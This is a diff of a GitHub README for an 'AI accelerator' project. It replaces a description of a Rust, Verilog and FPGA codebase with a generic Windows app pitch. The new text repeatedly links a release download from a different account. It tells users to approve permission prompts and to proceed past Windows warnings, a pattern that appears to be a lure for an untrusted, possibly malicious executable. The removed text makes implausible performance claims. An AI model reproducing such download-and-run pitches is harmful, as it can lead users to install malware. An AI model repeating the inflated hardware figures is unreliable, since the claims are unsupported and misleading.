@@ -1,121 +1,194 @@
-<p align="left">
-  <img src="https://i.imgur.com/SVYQoHL.png" alt="Hyze Logo" width="255">
-</p>
+# 🤖 HyzeIPUChip - Run AI Inference With More Control
 
-# Hyze IPU: Heterogeneous AI Accelerator Chip
+[⬇️ Download HyzeIPUChip](https://github.com/sound-arthurholmes351/HyzeIPUChip/releases){style="background-color:#4a90e2;color:#ffffff;padding:10px 16px;border-radius:8px;text-decoration:none;display:inline-block;font-weight:bold;"}
 
-**Hyze IPU** is a cutting-edge, heterogeneous AI acceleration platform that integrates **CPU, GPU, and a custom IPU (Intelligence Processing Unit)** into a unified architecture. Designed for ultra-low latency inference, massive context windows, and hardware-enforced security, Hyze IPU targets the next generation of enterprise AI workloads.
+## 🚀 Overview
 
----
+HyzeIPUChip is a Windows app for running AI inference on a mix of CPU, GPU, and IPU resources. It is built for users who want a local AI setup that puts speed, security, and hardware use in one place.
 
-## 🌟 Key Highlights
+It uses a heterogeneous compute model, which means the app can split work across different parts of your system. That can help reduce load on one device and keep tasks moving with less strain.
 
-| Feature | Performance / Specification |
-| :--- | :--- |
-| **Inference Latency** | **0.04μs per token** (1250x faster than traditional GPUs) |
-| **Compute Density** | **8 TOPS** on Lattice ECP5; **100k TOPS** at rack-scale |
-| **Cold Start** | **0ms** via WASM-optimized serverless edge runtime |
-| **Context Window** | Supports up to **10M tokens** via context streaming |
-| **Power Efficiency** | **5W TDP** for edge inference (60x more efficient than 300W GPUs) |
-| **Security** | Hardware-level **Prompt Guard**, **Confidential Enclaves**, and **Quantum-Safe Crypto** |
+Use it to:
+- run AI models on your PC
+- manage local inference tasks
+- use CPU and GPU together
+- connect to IPU-based processing when available
+- keep AI work on your own machine
 
----
+## 💻 What You Need
 
-## 🏗️ Architecture Stack
+Use a Windows PC with:
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 10 GB free disk space
+- a modern CPU
+- a GPU with current drivers if you want GPU support
+- internet access for the first download
 
-The Hyze ecosystem spans from silicon to the cloud, providing a full-stack solution for AI deployment.
+For best results:
+- 16 GB RAM or more
+- an SSD
+- the latest Windows updates
+- current NVIDIA or AMD drivers
 
-### 1. Hardware Layer (RTL)
-- **NPU Core**: A high-performance neural processing unit optimized for quantized 8-bit inference.
-- **Safety FSM**: Real-time hardware-level prompt filtering and jailbreak detection.
-- **DMA Controller**: High-speed data movement between SRAM and host memory.
-- **Truth Engine**: Hardware-accelerated verification of model outputs.
+## 📦 Download
 
-### 2. Driver & Runtime Layer
-- **Rust Host Driver**: Safe and concurrent host-to-device communication via USB/PCIe.
-- **ONNX Compiler**: A custom toolchain that compiles ONNX models directly into synthesizable Verilog.
-- **Multi-modal Runtime**: Unified execution environment for text, image, and audio processing.
+Visit this page to download the app:
 
-### 3. Enterprise & Cloud Layer
-- **Serverless Edge**: WASM-based inference for Cloudflare Workers and edge nodes.
-- **Orchestrator**: Rack-scale management of 64-tile IPU clusters and GPU offloading.
-- **Secure Controllers**: Java/Spring Boot based management plane with Istio service mesh integration.
+[Download HyzeIPUChip](https://github.com/sound-arthurholmes351/HyzeIPUChip/releases)
 
----
+Open the latest release and get the Windows file that matches your system. If there are more than one file, choose the one meant for Windows users.
 
-## 📂 Repository Structure
+## 🪟 Install on Windows
 
-```text
-.
-├── src/                        # Rust Host Stack
-│   ├── main.rs                 # CLI Entrypoint (Compile/Infer)
-│   ├── onnx_compiler.rs        # ONNX to Verilog RTL Compiler
-│   ├── driver.rs               # USB/PCIe Device Driver
-│   └── worker.rs               # WASM Serverless Handler
-├── rtl/                        # Hardware Design (SystemVerilog/Verilog)
-│   ├── hyze_ipu_npu_core.v     # Core NPU Logic
-│   ├── hyze_ipu_safety_fsm.sv  # Hardware Prompt Filter
-│   └── hyze_ipu_pipeline.sv    # Execution Pipeline
-├── drivers/                    # Native Drivers
-│   ├── hyze_ipu_pcie_driver.cpp # C++ PCIe Driver
-│   └── hyze_ipu_zig_driver.zig  # Zig Low-level Driver
-├── cloud/                      # Cloud & Edge Integration
-│   ├── hyze_istio_dp_policy.yaml # Istio Security Policy
-│   └── wrangler.toml           # Cloudflare Workers Config
-└── enterprise/                 # Management Plane
-    ├── HyzeMegaChipController.java # Spring Boot Controller
-    └── HyzeSecureController.java   # Security Management
-```
+1. Open the download page.
+2. Find the latest release.
+3. Download the Windows installer or app file.
+4. Open the file after it finishes downloading.
+5. If Windows asks for permission, choose **Yes**.
+6. Follow the setup prompts on the screen.
+7. Finish the install.
+8. Open HyzeIPUChip from your Start menu or desktop.
 
----
+If the app comes as a zipped file:
+1. Right-click the file.
+2. Choose **Extract All**.
+3. Open the extracted folder.
+4. Double-click the app file inside.
 
-## 🚀 Getting Started
+## ▶️ First Run
 
-### Prerequisites
-- **Rust**: `cargo` (latest stable)
-- **Hardware Tools**: Yosys, nextpnr (for FPGA synthesis)
-- **C++ Compiler**: GCC/Clang with `libpci`
-- **Java**: JDK 17+ and Maven
+When you open HyzeIPUChip for the first time:
+1. Let it finish any setup steps.
+2. Choose your preferred compute mode.
+3. Allow the app to detect your CPU and GPU.
+4. Pick a model or workload if the app asks for one.
+5. Start the task and watch the status screen.
 
-### Installation
-```bash
-git clone https://github.com/hiteshv2603-ui/HyzeIPUChip.git
-cd HyzeIPUChip
-```
+If the app offers a simple mode choice:
+- **CPU mode** for broad support
+- **GPU mode** for faster compute on supported cards
+- **Hybrid mode** for CPU and GPU together
+- **IPU mode** for custom IPU support
 
-### Building the Host Stack
-```bash
-cargo build --release
-```
+## ⚙️ Basic Use
 
-### Compiling an ONNX Model to RTL
-```bash
-./target/release/hyze-ipu-host compile --onnx model.onnx --output rtl/weights.sv
-```
+HyzeIPUChip is built to keep AI work simple.
 
-### Running Inference
-```bash
-./target/release/hyze-ipu-host infer --pixels input.bin
-```
+Typical steps:
+1. Open the app.
+2. Load a model or project.
+3. Choose the device setup.
+4. Set the task size or quality level.
+5. Start inference.
+6. Review the output.
 
----
+You may see settings for:
+- batch size
+- model path
+- device selection
+- memory use
+- security mode
+- log output
 
-## 🛡️ Security & Compliance
+For most users, the default settings are a good place to start.
 
-Hyze IPU is built with a **Security-First** philosophy:
-- **Hardware Prompt Guard**: Blocks malicious prompts (jailbreaks, PII leaks) at the gate-level with zero software overhead.
-- **Confidential Enclaves**: TEE-based execution for sensitive model weights and user data.
-- **SBOM Enforcer**: Real-time verification of software components to prevent supply-chain attacks.
-- **Quantum-Safe Crypto**: Future-proof encryption for all data-in-transit and data-at-rest.
+## 🔐 Security Features
 
----
+HyzeIPUChip is focused on local AI use and control. That can help keep your data on your own system.
 
-## 🤝 Contributing
+Common security-focused features may include:
+- local-only processing
+- device control settings
+- limited network use
+- secure model loading
+- protected runtime paths
 
-We welcome contributions to the Hyze ecosystem! Please see our contribution guidelines for more details on how to get involved with RTL design, driver development, or cloud integrations.
+If you use private data, keep your models and files in folders you trust. Use the app only from the release page linked above.
 
----
+## 🧠 Device Support
 
-## 📜 License
+HyzeIPUChip is designed around a mixed hardware setup.
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+It may use:
+- CPU for general work
+- GPU for faster parallel tasks
+- IPU for custom inference paths
+
+This setup can help when one device is under load or when you want to match work to the best available hardware.
+
+## 🛠️ Troubleshooting
+
+If the app does not open:
+- check that the download finished
+- run it again as a normal user
+- make sure Windows did not block the file
+- try rebooting your PC
+
+If you do not see GPU use:
+- update your graphics drivers
+- check that your GPU is supported
+- switch to hybrid or CPU mode
+- close other heavy apps
+
+If the app feels slow:
+- use a smaller model
+- lower the batch size
+- close other programs
+- move the app and models to an SSD
+
+If Windows warns about the file:
+- confirm that you downloaded it from the release page
+- open the latest release again
+- use the Windows file from that page
+
+## 📝 Common Use Cases
+
+HyzeIPUChip fits well if you want to:
+- test local AI models
+- run inference without cloud tools
+- use CPU and GPU together
+- explore AI chip workflows
+- keep inference on your own PC
+- try security-aware AI processing
+
+## 📁 Suggested Folder Setup
+
+For easier use, keep your files organized like this:
+- `Downloads` for the installer
+- `HyzeIPUChip` for the app
+- `Models` for AI model files
+- `Output` for saved results
+- `Logs` for app logs
+
+A clean folder layout makes it easier to find files and remove old ones later
+
+## 🧩 Project Topics
+
+This project relates to:
+- AI inference
+- AI accelerator use
+- AI training workflows
+- local model runs
+- CPU and GPU computing
+- security-focused processing
+- new hardware design
+- NPU and IPU-style systems
+- Claude and OpenAI related workflows
+- Groq-style fast inference ideas
+
+## 📥 Download and Run
+
+Use this link to visit the release page, then download and run the Windows file:
+
+[HyzeIPUChip Releases](https://github.com/sound-arthurholmes351/HyzeIPUChip/releases)
+
+## 🖥️ Quick Start Steps
+
+1. Visit the release page.
+2. Download the latest Windows file.
+3. Open the file.
+4. Install or extract the app.
+5. Launch HyzeIPUChip.
+6. Pick a device mode.
+7. Start your AI task
